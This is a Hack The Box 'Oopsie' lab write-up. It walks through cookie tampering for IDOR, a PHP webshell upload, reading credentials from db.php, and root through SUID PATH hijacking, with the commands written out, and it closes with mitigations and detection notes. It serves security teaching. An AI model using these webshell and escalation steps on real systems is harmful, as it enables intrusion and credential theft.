---
machine: Oopsie
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, idor, upload, suid, tier2]
---

# Oopsie — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

A guest login with an **IDOR in the cookies** (`role=admin`, `id=1`) opens the admin panel. From there you upload a webshell, read `robert`'s credentials from the source, and escalate with a **SUID `bugtracker`** that calls `cat` without an absolute path (PATH hijacking).

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp open ssh  OpenSSH 7.6p1 Ubuntu
80/tcp open http Apache httpd 2.4.29 (Ubuntu)
```

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
/cdn-cgi/login/    (200)
/uploads/          (403)
/assets
```

## Enumeration

`/cdn-cgi/login/` lets you in as a guest. The session cookies are:

```text
user=2233
role=guest
```

Edit them by hand: `role=admin` and `user=1`. The panel answers with the admin view and an upload form.

## Foothold

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP
curl -s -b 'user=1; role=admin' -F 'file=@shell.php' http://<TARGET_IP>/uploads/
curl -s "http://<TARGET_IP>/uploads/shell.php?c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral movement

The login source holds both database and system user credentials:

```bash
curl -s "http://<TARGET_IP>/uploads/shell.php?c=cat+/var/www/html/cdn-cgi/login/db.php"
```

```bash
ssh robert@<TARGET_IP>
```

## Privilege escalation

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/bugtracker
```

`bugtracker` runs `cat` without an absolute path. Create a malicious `cat` in a writable directory and prepend it to `PATH`:

```bash
cd /tmp
printf '#!/bin/sh\n/bin/sh\n' > cat
chmod +x cat
PATH=/tmp:$PATH /usr/bin/bugtracker
```

```text
# id
uid=0(root)
```

## Evidence

- Tampered cookies and the admin panel.
- `find` output with the SUID and a root shell.

## Lessons learned

- Client-side access control (cookies) is an invitation to IDOR.
- An upload form without type or execution validation is direct RCE.
- Source code readable from the web leaks system credentials.
- A SUID binary calling another without an absolute path is hijacked with `PATH`.

## Mitigations and detection

- Server-side authorisation: the role never travels in an editable cookie.
- Uploads outside the document root, renamed, without execute permission.
- Secrets in environment variables or a manager, not in `db.php`.
- Minimal SUID; absolute paths and a clean `PATH`.
- Detection: `role=admin` cookies on guest sessions, `.php` files in `/uploads/`, `bugtracker` runs with an altered `PATH`.

- CWE-639 (IDOR), CWE-434, CWE-426
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1505.003](https://attack.mitre.org/techniques/T1505/003/), [T1574.007](https://attack.mitre.org/techniques/T1574/007/)

## References

- [OWASP — Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- [HackTricks — SUID / PATH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
